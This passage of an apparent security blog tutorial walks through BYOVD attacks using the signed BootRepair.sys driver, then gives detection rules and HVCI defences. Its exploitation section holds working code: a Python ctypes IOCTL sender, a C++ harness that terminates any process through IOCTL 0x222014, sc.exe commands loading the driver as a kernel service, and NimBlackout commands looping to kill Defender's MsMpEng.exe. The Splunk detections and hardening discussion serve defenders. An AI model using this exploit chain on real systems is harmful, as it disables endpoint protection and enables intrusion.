  <text x="215" y="531" font-size="10" fill="#6897bb">  return </text><text x="265" y="531" font-size="10" fill="#9876aa">STATUS_SUCCESS</text><text x="358" y="531" font-size="10" fill="#a9b7c6">;</text>
  <text x="215" y="546" font-size="10" fill="#a9b7c6">}</text>

  <!-- Right panel: Ghidra notes -->
  <rect x="740" y="52" width="160" height="500" fill="#313335" stroke="#555" stroke-width="0.5"/>
  <text x="750" y="70" font-size="10" fill="#a9b7c6" font-weight="bold">Ghidra Workflow</text>
  <line x1="740" y1="74" x2="900" y2="74" stroke="#555" stroke-width="1"/>

  <text x="750" y="93" font-size="9" fill="#cc7832" font-weight="bold">① Symbol Tree</text>
  <text x="750" y="108" font-size="9" fill="#888">Expand Imports →</text>
  <text x="750" y="123" font-size="9" fill="#888">right-click import</text>
  <text x="750" y="138" font-size="9" fill="#888">→ References →</text>
  <text x="750" y="153" font-size="9" fill="#cc7832">Show References</text>

  <line x1="750" y1="163" x2="895" y2="163" stroke="#444" stroke-width="0.5"/>
  <text x="750" y="180" font-size="9" fill="#ffc66d" font-weight="bold">② Rename (L)</text>
  <text x="750" y="195" font-size="9" fill="#888">Press L on function</text>
  <text x="750" y="210" font-size="9" fill="#888">to rename. Use</text>
  <text x="750" y="225" font-size="9" fill="#888">Ctrl+L for vars.</text>

  <line x1="750" y1="235" x2="895" y2="235" stroke="#444" stroke-width="0.5"/>
  <text x="750" y="252" font-size="9" fill="#6a8759" font-weight="bold">③ IOCTL constant</text>
  <text x="750" y="267" font-size="9" fill="#888">Search → For</text>
  <text x="750" y="282" font-size="9" fill="#888">Scalars. Enter</text>
  <text x="750" y="297" font-size="9" fill="#6a8759">0x222014</text>
  <text x="750" y="312" font-size="9" fill="#888">or use script:</text>
  <text x="750" y="327" font-size="9" fill="#6a8759">find_ioctls.py</text>

  <line x1="750" y1="337" x2="895" y2="337" stroke="#444" stroke-width="0.5"/>
  <text x="750" y="354" font-size="9" fill="#9876aa" font-weight="bold">④ Decompiler</text>
  <text x="750" y="369" font-size="9" fill="#888">Window →</text>
  <text x="750" y="384" font-size="9" fill="#888">Decompiler. Shows</text>
  <text x="750" y="399" font-size="9" fill="#888">C pseudo-code.</text>
  <text x="750" y="414" font-size="9" fill="#9876aa">NULL in 5th arg</text>
  <text x="750" y="429" font-size="9" fill="#888">to IoCreateDevice</text>
  <text x="750" y="444" font-size="9" fill="#888">= no DACL.</text>

  <line x1="750" y1="454" x2="895" y2="454" stroke="#444" stroke-width="0.5"/>
  <text x="750" y="471" font-size="9" fill="#808080" font-weight="bold">Script tip</text>
  <text x="750" y="486" font-size="9" fill="#888">Analysis → Run</text>
  <text x="750" y="501" font-size="9" fill="#888">Script → import</text>
  <text x="750" y="516" font-size="9" fill="#6a8759">DrvEye --ghidra</text>
  <text x="750" y="531" font-size="9" fill="#888">for auto-labels</text>
  <text x="750" y="546" font-size="9" fill="#888">&amp; IOCTL decode</text>
</svg>
</div>

Ghidra's free, open-source nature makes it the go-to for driver RE in resource-constrained environments. The workflow mirrors IDA's but with different mechanics:

**Step 1: Symbol Tree → Imports.** Expand `Imports` in the Symbol Tree panel. Right-click `ZwTerminateProcess` → `References → Show References to ZwTerminateProcess`. The reference panel lists every call site.

**Step 2: Decompiler + Rename.** Double-click a reference to jump to the caller. The Decompiler pane (Window → Decompiler) renders C pseudo-code automatically, far faster to read than raw disassembly. Press `L` to rename the function (e.g. `terminate_proc`). Press `Ctrl+L` to rename local variables.

**Step 3: Find the IOCTL constant.** `Search → For Scalars`. Enter `0x222014`. Ghidra highlights all occurrences across the entire binary. Alternatively, use Ghidra's `find_ioctls.py` community script (from the Ghidra Script Manager) which automatically walks dispatch tables and emits a decoded IOCTL list.

**Step 4: DriverEntry NULL SecurityDescriptor.** Follow the string `\Device\BootRepair` (Defined Strings panel) to its xref in `DriverEntry`. The Decompiler renders the `IoCreateDevice` call clearly. The fifth argument (SecurityDescriptor) being `NULL` is immediately visible in the pseudo-code; no assembly reading required.

**Key Ghidra advantage over IDA for this workflow:** the decompiler produces readable C that makes the `NULL SecurityDescriptor` and missing `InputBufferLength` guard checks visible at a glance, without needing to trace register values through multiple basic blocks.

### Device Path Recovery

For hardened drivers that construct device names at runtime (string concatenation, XOR decoding, format strings), static analysis fails in both tools. DrvEye handles this via a Unicorn-emulated `DriverEntry` sandbox that executes the initialisation code and captures the resulting device name, without loading unsigned code on a real system.

### Dynamic Analysis: Intercepting IOCTLs with Frida

When a driver computes IOCTL codes at runtime, or when static analysis reveals multiple candidate constants and you need to confirm which one fires under real conditions, dynamic interception is faster than a debugger. The Frida hook below attaches to any user-mode process and logs every `DeviceIoControl` call with its code and input buffer before the IRP crosses the Ring 3 boundary.

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">frida_ioctl_hook.js — Frida 16.x</span>
  </div>
  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
    <div><span style="color:#484f58;">// Hook DeviceIoControl — log every IOCTL code and input buffer</span></div>
    <div><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">DeviceIoControl</span><span style="color:#8b949e;"> = </span><span style="color:#fbbf24;">Module.findExportByName</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"kernel32.dll"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"DeviceIoControl"</span><span style="color:#8b949e;">);</span></div>
    <div style="margin-top:4px;"><span style="color:#a78bfa;">Interceptor</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">attach</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">DeviceIoControl</span><span style="color:#8b949e;">, {</span></div>
    <div style="margin-left:20px;"><span style="color:#fbbf24;">onEnter</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">args</span><span style="color:#8b949e;">) {</span></div>
    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">code</span><span style="color:#8b949e;">   = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[1].</span><span style="color:#fbbf24;">toInt32</span><span style="color:#8b949e;">();</span></div>
    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">inSize</span><span style="color:#8b949e;"> = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[3].</span><span style="color:#fbbf24;">toInt32</span><span style="color:#8b949e;">();</span></div>
    <div style="margin-left:40px;"><span style="color:#60a5fa;">const </span><span style="color:#a78bfa;">inBuf</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">args</span><span style="color:#8b949e;">[2];</span></div>
    <div style="margin-left:40px;margin-top:4px;"><span style="color:#17fe33;">console</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">log</span><span style="color:#8b949e;">(</span></div>
    <div style="margin-left:60px;"><span style="color:#17fe33;">"[IOCTL]"</span><span style="color:#8b949e;">,</span></div>
    <div style="margin-left:60px;"><span style="color:#17fe33;">"code=0x"</span><span style="color:#8b949e;"> + </span><span style="color:#a78bfa;">code</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">toString</span><span style="color:#8b949e;">(16).</span><span style="color:#fbbf24;">padStart</span><span style="color:#8b949e;">(8, </span><span style="color:#17fe33;">"0"</span><span style="color:#8b949e;">),</span></div>
    <div style="margin-left:60px;"><span style="color:#17fe33;">"inSize="</span><span style="color:#8b949e;"> + </span><span style="color:#a78bfa;">inSize</span></div>
    <div style="margin-left:40px;"><span style="color:#8b949e;">);</span></div>
    <div style="margin-left:40px;margin-top:4px;"><span style="color:#60a5fa;">if </span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">inSize</span><span style="color:#8b949e;"> === </span><span style="color:#f97316;">4</span><span style="color:#8b949e;">)</span></div>
    <div style="margin-left:60px;"><span style="color:#17fe33;">console</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">log</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"  pid ="</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">inBuf</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">readU32</span><span style="color:#8b949e;">());</span></div>
    <div style="margin-left:20px;"><span style="color:#8b949e;">}</span></div>
    <div><span style="color:#8b949e;">});</span></div>
    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;">
      <span style="color:#484f58;">// frida -p &lt;PID&gt; -l frida_ioctl_hook.js</span>
    </div>
    <div><span style="color:#484f58;">// frida -n MsMpEng.exe -l frida_ioctl_hook.js  ← hook AV vendor binary directly</span></div>
  </div>
</div>

Attach to `MsMpEng.exe` or any other vendor binary to observe every IOCTL its user-mode component sends to its own driver. The `inSize === 4` branch auto-decodes the PID from a `METHOD_BUFFERED` 4-byte input, confirming both the control code and the exact input format without touching the driver binary.

### Sending IOCTLs from Python

Once the device path, IOCTL code, and input buffer layout are confirmed, `ctypes` provides everything needed to build a working PoC without compiling a C project. Two primitives are sufficient: `CreateFileW` to obtain a device handle, and `DeviceIoControl` to dispatch the IRP.

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">byovd_sender.py — Python 3.x · requires Administrator</span>
  </div>
  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
    <div><span style="color:#60a5fa;">import </span><span style="color:#8b949e;">ctypes, ctypes.wintypes </span><span style="color:#60a5fa;">as </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">, struct</span></div>
    <div style="margin-top:6px;"><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">windll</span><span style="color:#8b949e;">.kernel32</span></div>
    <div style="margin-top:8px;"><span style="color:#a78bfa;">GENERIC_RW</span><span style="color:#8b949e;">     = </span><span style="color:#f97316;">0x80000000</span><span style="color:#8b949e;"> | </span><span style="color:#f97316;">0x40000000</span></div>
    <div><span style="color:#a78bfa;">FILE_SHARE_RW</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">0x1</span><span style="color:#8b949e;"> | </span><span style="color:#f97316;">0x2</span></div>
    <div><span style="color:#a78bfa;">OPEN_EXISTING</span><span style="color:#8b949e;">  = </span><span style="color:#f97316;">3</span></div>
    <div><span style="color:#a78bfa;">INVALID_HANDLE</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">.</span><span style="color:#a78bfa;">HANDLE</span><span style="color:#8b949e;">(-1).value</span></div>
    <div style="margin-top:10px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">open_device</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">path</span><span style="color:#8b949e;">: str):</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">CreateFileW</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">path</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">GENERIC_RW</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">FILE_SHARE_RW</span><span style="color:#8b949e;">,</span></div>
    <div style="margin-left:60px;"><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">OPEN_EXISTING</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x80</span><span style="color:#8b949e;">, </span><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">)</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">if </span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> == </span><span style="color:#a78bfa;">INVALID_HANDLE</span><span style="color:#8b949e;">:</span></div>
    <div style="margin-left:40px;"><span style="color:#60a5fa;">raise </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">WinError</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">get_last_error</span><span style="color:#8b949e;">())</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#a78bfa;">h</span></div>
    <div style="margin-top:10px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">send_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">code</span><span style="color:#8b949e;">: int, </span><span style="color:#f97316;">data</span><span style="color:#8b949e;">: bytes, </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">: int = </span><span style="color:#f97316;">0</span><span style="color:#8b949e;">) -&gt; bytes:</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">buf_in</span><span style="color:#8b949e;">  = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">create_string_buffer</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">data</span><span style="color:#8b949e;">)</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">create_string_buffer</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">) </span><span style="color:#60a5fa;">if </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;"> </span><span style="color:#60a5fa;">else </span><span style="color:#60a5fa;">None</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">       = </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">.</span><span style="color:#a78bfa;">DWORD</span><span style="color:#8b949e;">(0)</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">ok</span><span style="color:#8b949e;">      = </span><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">code</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">buf_in</span><span style="color:#8b949e;">, </span><span style="color:#fbbf24;">len</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">data</span><span style="color:#8b949e;">),</span></div>
    <div style="margin-left:64px;"><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">byref</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">), </span><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">)</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">if not </span><span style="color:#a78bfa;">ok</span><span style="color:#8b949e;">:</span></div>
    <div style="margin-left:40px;"><span style="color:#60a5fa;">raise </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">WinError</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">get_last_error</span><span style="color:#8b949e;">())</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#fbbf24;">bytes</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;">)[:</span><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">.value] </span><span style="color:#60a5fa;">if </span><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;"> </span><span style="color:#60a5fa;">else </span><span style="color:#17fe33;">b""</span></div>
    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;">
      <span style="color:#484f58;"># --- send IOCTL 0x222014 to BootRepair.sys ---</span>
    </div>
    <div><span style="color:#a78bfa;">target_pid</span><span style="color:#8b949e;"> = </span><span style="color:#f97316;">1234</span><span style="color:#484f58;">                     # replace with real PID</span></div>
    <div><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> = </span><span style="color:#fbbf24;">open_device</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">r"\\.\BootRepair"</span><span style="color:#8b949e;">)</span></div>
    <div><span style="color:#60a5fa;">try</span><span style="color:#8b949e;">:</span></div>
    <div style="margin-left:20px;"><span style="color:#fbbf24;">send_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">, struct.</span><span style="color:#fbbf24;">pack</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"&lt;I"</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">target_pid</span><span style="color:#8b949e;">))</span></div>
    <div><span style="color:#60a5fa;">finally</span><span style="color:#8b949e;">:</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">CloseHandle</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;">)</span></div>
  </div>
</div>

`send_ioctl` handles buffer allocation and Win32 error translation automatically. For `METHOD_BUFFERED` IOCTLs the kernel copies `data` into `SystemBuffer` without any MDL work on the caller's side. The call requires Administrator privileges to open the device handle, matching the standard BYOVD prerequisite. For drivers with `METHOD_NEITHER` (raw pointer pass-through), the input buffer must be a locked, page-aligned allocation — avoid those drivers in PoC work unless you are comfortable with structured exception handling in kernel mode.

---

## Phase 3: Exploitation

With symbolic link, IOCTL code, and buffer layout in hand, exploitation reduces to a handful of Win32 API calls requiring only administrative privileges.

### Case Study: PhantomKiller

[PhantomKiller](https://github.com/redteamfortress/PhantomKiller) by j3h4ck (redteamfortress) documents the end-to-end weaponisation of `BootRepair.sys`, a Lenovo PC Manager driver signed by Symantec under LENOVO's code-signing certificate (SHA-256, compiled 2018-01-03). Found on VirusTotal with 0/71 detections at time of discovery.

| Field       | Value                                                              |
|-------------|---------------------------------------------------------------------|
| File        | `BootRepair.sys`                                                    |
| SHA-256     | `5ab36c116767eaae53a466fbc2dae7cfd608ed77721f65e83312037fbd57c946` |
| Signer      | LENOVO (Symantec Class 3 SHA256 Code Signing CA)                    |
| Compiled    | 2018-01-03                                                          |
| VT hits     | 0/71 at discovery                                                   |
| Device path | `\\.\BootRepair`                                                    |
| IOCTL       | `0x222014`                                                          |
| Input       | 4-byte DWORD PID                                                    |

**Loading the driver:**

```batch
rem Requires Administrator. DSE satisfied — legitimately signed.
sc.exe create PhantomKiller binPath="C:\tools\BootRepair.sys" type=kernel
sc.exe start PhantomKiller
```

**The exploit harness (simplified):**

```cpp
#include <windows.h>
#include <stdio.h>

#define IOCTL_KILL_PROCESS 0x222014

int main(int argc, char* argv[]) {
    DWORD targetPid = (DWORD)atoi(argv[1]);

    // No DACL on device → CreateFile succeeds for any caller
    HANDLE hDevice = CreateFileA(
        "\\\\.\\BootRepair",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    DWORD bytesReturned = 0;
    DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,   // 0x222014
        &targetPid,           // Input: 4-byte PID
        sizeof(DWORD),        // InputBufferLength: 4
        NULL, 0, &bytesReturned, NULL
    );

    printf("[+] Process %d terminated via kernel\n", targetPid);
    CloseHandle(hDevice);
    return 0;
}
```

### The Full Kernel Call Chain

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">kernel_call_chain — BootRepair.sys › ZwTerminateProcess</span>
  </div>
  <div style="font-family:'Courier New',monospace;font-size:12.5px;line-height:2.0;">

    <!-- Ring 3 zone -->
    <div style="background:#0d1117;padding:12px 22px 14px;border-bottom:1px solid #21262d;">
      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 3 · User Mode</div>
      <div><span style="color:#8b949e;">CreateFile(</span><span style="color:#17fe33;">"\\.\BootRepair"</span><span style="color:#8b949e;">) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hDevice</span></div>
      <div><span style="color:#60a5fa;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hDevice</span><span style="color:#8b949e;">,&nbsp;</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">,&nbsp;&amp;pid,&nbsp;4)</span></div>
    </div>

    <!-- Ring boundary -->
    <div style="background:#161b22;text-align:center;padding:7px 0;color:#f97316;font-size:11px;letter-spacing:1px;border-top:1px dashed #30363d;border-bottom:1px dashed #30363d;">
      ▼&nbsp;&nbsp;IRP crosses Ring 3 → Ring 0 boundary&nbsp;&nbsp;▼
    </div>

    <!-- Ring 0 zone -->
    <div style="background:#0d1117;padding:12px 22px 16px;border-bottom:1px solid #21262d;">
      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 0 · Kernel Mode</div>
      <div><span style="color:#8b949e;">IRP dispatch → </span><span style="color:#a78bfa;">MajorFunction</span><span style="color:#8b949e;">[14]</span><span style="color:#484f58;">&nbsp;&nbsp;; IRP_MJ_DEVICE_CONTROL</span></div>
      <div style="margin-left:22px;"><span style="color:#484f58;">└─► </span><span style="color:#8b949e;">IOCTL match&nbsp;</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;"> → call </span><span style="color:#fbbf24;">terminate_proc</span><span style="color:#8b949e;">(pid)</span></div>
      <div style="margin-left:46px;"><span style="color:#484f58;">├─► </span><span style="color:#17fe33;">PsLookupProcessByProcessId</span><span style="color:#8b949e;">(pid) </span><span style="color:#484f58;">→ </span><span style="color:#a78bfa;">PEPROCESS</span><span style="color:#8b949e;"> *</span></div>
      <div style="margin-left:46px;"><span style="color:#484f58;">├─► </span><span style="color:#17fe33;">ObOpenObjectByPointer</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">PEPROCESS</span><span style="color:#8b949e;">*) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hProcess</span><span style="color:#484f58;">&nbsp;&nbsp;; PROCESS_ALL_ACCESS · no PPL check</span></div>
      <div style="margin-left:46px;"><span style="color:#484f58;">└─► </span><span style="color:#f97316;">ZwTerminateProcess</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hProcess</span><span style="color:#8b949e;">, 0)</span></div>
    </div>

    <!-- Impact zone -->
    <div style="background:#160b0b;padding:12px 22px 14px;border-top:2px solid #7f1d1d;">
      <div style="color:#ef4444;font-weight:600;margin-bottom:8px;">◼ Target process exits</div>
      <div style="display:flex;gap:28px;flex-wrap:wrap;">
        <span style="color:#6b7280;font-size:11px;">✗ PPL protection bypassed</span>
        <span style="color:#6b7280;font-size:11px;">✗ No access check performed</span>
        <span style="color:#6b7280;font-size:11px;">✗ EDR tamper-protection: irrelevant</span>
      </div>
    </div>

  </div>
</div>

PPL protection is enforced at the user-mode `OpenProcess` boundary, not at the kernel object level when a driver acquires the handle directly via `ObOpenObjectByPointer`. This is the fundamental architectural gap that BYOVD exploits.

### NimBlackout

[NimBlackout](https://github.com/Helixo32/NimBlackout) adapts the same technique (originally from ZeroMemoryEx's Blackout project using the `gmer.sys` driver) in Nim. The keep-alive pattern is the operationally significant addition: EDR vendors configure agents to respawn via watchdog services. NimBlackout loops continuously, re-killing the target each time it restarts, converting a one-shot termination into persistent blindness:

```bash
# Cross-compile from Linux
nim --os:windows --cpu:amd64 \
    --gcc.exe:x86_64-w64-mingw32-gcc \
    --gcc.linkerexe:x86_64-w64-mingw32-gcc \
    c NimBlackout.nim

# Execute — loops to defeat EDR watchdog respawn
.\NimBlackout.exe MsMpEng.exe
```

---

## MITRE ATT&CK Mapping

| Technique                              | ID            | BYOVD Manifestation                                         |
|----------------------------------------|---------------|-------------------------------------------------------------|
| Exploit Privilege Escalation           | `T1068`       | Admin → Ring 0 effective privilege via vulnerable driver    |
| Impair Defenses: Disable/Remove Tools  | `T1562.001`   | EDR/AV process terminated via kernel call                   |
| Create or Modify System Process        | `T1543.003`   | Driver loaded as kernel service via `sc.exe`                |
| Rootkit                                | `T1014`       | Kernel-mode code with no user-mode visibility               |
| Defense Evasion: Signed Binary         | `T1553.002`   | Signed driver circumvents DSE and AV signature checks       |

---

## Detection Engineering and Hunting Playbook

### Signal 1: Driver Load Events

**Sysmon Event ID 6** fires on every kernel driver load. It captures the SHA-256 hash at load time, matchable against LOLDrivers in near-real-time.

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| where match(ImageLoaded, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\users\\\\[^\\\\]+\\\\desktop\\\\)")
| table _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
| sort - _time
```

### Signal 2: Service Creation of Kernel Drivers

Windows Event Log `System / 7045` with `ServiceType=1` from a non-standard binary path is near-definitive:

```spl
index=wineventlog source="WinEventLog:System" EventCode=7045
| where ServiceType="kernel"
| where NOT match(ImagePath, "(?i)(system32\\\\drivers|program files)")
| table _time, ComputerName, ServiceName, ImagePath, ServiceType
```

### Signal 3: DeviceIoControl to Unknown Devices

Monitor `CreateFile` with `\\.\` device paths combined with subsequent `DeviceIoControl` calls from unexpected processes. Any non-system, non-hardware-management software opening a raw device path is suspicious.

### Signal 4: Protected Process Termination Anomalies

Correlate EDR heartbeat absence with recent driver load:

- EDR service stopped (Event 7036) without planned shutdown
- Sysmon EID 5 (process terminate) on known EDR process names within 10 minutes of EID 6 (driver load)

### Signal 5: LOLDrivers Hash Matching at Ingest

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| lookup loldrivers.csv sha256 AS sha256 OUTPUT driver_name, cve, primitive
| where isnotnull(primitive)
| table _time, Computer, ImageLoaded, sha256, driver_name, primitive
```

Maintain the lookup table from [loldrivers.io/api/drivers.csv](https://www.loldrivers.io/api/drivers.csv) (updated daily via a scheduled task).

### Splunk Detection Rules

**Rule 1: BYOVD Kernel Driver Loaded from User Path**

```spl
index=sysmon EventCode=6
| rex field=Hashes "SHA256=(?P<sha256>[A-Fa-f0-9]{64})"
| eval path_suspicious=if(match(ImageLoaded,
    "(?i)(\\\\temp\\\\|\\\\users\\\\.*\\\\appdata\\\\|\\\\programdata\\\\|\\\\downloads\\\\)"),
    1, 0)
| where path_suspicious=1 OR Signed="false"
| stats count by _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
| sort - _time
```

**Rule 2: New Kernel Service + Driver Load Correlation (within 60 seconds)**

```spl
index=wineventlog source="WinEventLog:System" EventCode=7045 ServiceType="kernel"
| join type=inner ComputerName [
    search index=sysmon EventCode=6
    | rename Computer AS ComputerName
]
| where Signed="false" OR match(ImagePath, "(?i)(\\\\temp\\\\|\\\\appdata\\\\)")
| table _time, ComputerName, ServiceName, ImagePath
```

**Rule 3: EDR Process Missing + Recent Driver Load (Threat Hunt)**

```spl
index=sysmon EventCode=5
| where Image IN ("MsMpEng.exe", "SentinelAgent.exe", "CSFalconService.exe",
                  "CrowdStrike.exe", "cb.exe", "elastic-agent.exe")
| eval kill_time=_time
| join type=inner Computer [
    search index=sysmon EventCode=6 earliest=-10m latest=+0m
    | where NOT match(ImageLoaded, "(?i)(system32\\\\drivers|program files)")
    | eval driver_load_time=_time
]
| where kill_time > driver_load_time AND kill_time < (driver_load_time + 600)
| table _time, Computer, Image, ImageLoaded, Hashes
```

---

## Defensive Architecture: HVCI Deep Dive

### What HVCI Actually Enforces

HVCI (Hypervisor-Protected Code Integrity, also called Memory Integrity) uses the hypervisor to move kernel code integrity checks into a more privileged context than the Windows kernel itself:

| Requirement | DSE Only | DSE + HVCI |
|---|---|---|
| Valid Authenticode signature | ✔ | ✔ |
| Chain to trusted root | ✔ | ✔ |
| EV code signing cert or WHQL | Optional | Required for new drivers |
| `FORCE_INTEGRITY` flag in PE header | Not checked | Required |
| No W+X memory sections | Not checked | Enforced by hypervisor |
| No self-modifying code | Not checked | Enforced by hypervisor |

Legacy drivers compiled before ~2015 almost universally fail the W+X and `FORCE_INTEGRITY` checks. They are legitimately signed (DSE passes) but cannot load under HVCI. HVCI is the single most effective architectural control against BYOVD, though adoption remains below 50% on Windows 11-capable hardware as of 2025.

### The HVCI Block List Gap: Where BYOVD Still Lives

Even with HVCI enabled, a driver loads if its PE image meets HVCI structural requirements AND its hash is not in the WDAC Vulnerable Driver Block List (`SiPolicy_Enforced.p7b`). As of June 23, 2026, LOLDrivers tracks **479 of 2,197** catalogued samples (21.8%) that bypass HVCI. Another 789 samples (36.3%) are not in Microsoft's block list at all. Microsoft updates the block list once or twice per year; a driver found in January may remain loadable on HVCI-enabled systems for months.

### Hunting for a Working BYOVD Candidate

<!-- ============================================================
     DIAGRAM 4 — HVCI Driver Selection Funnel
     ============================================================ -->
<div style="margin:2rem 0;overflow-x:auto;">
